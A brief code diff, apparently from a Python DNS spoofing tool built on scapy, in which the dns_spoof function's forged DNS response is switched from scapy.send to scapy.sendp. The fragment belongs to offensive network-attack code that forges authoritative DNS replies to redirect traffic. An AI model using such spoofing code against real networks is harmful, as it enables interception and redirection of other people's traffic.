@@ -36,7 +36,7 @@ def dns_spoof(packet):
                        scapy.UDP(dport=udp_sport, sport=udp_dport) / \
                        scapy.DNS(id=dns_id, qr=1, aa=1, qd=dns_qd, an=dns_rr)
 
-    scapy.send(spoofed_response)
+    scapy.sendp(spoofed_response)
 
 def dns_main_loop():
     while dns_looping:
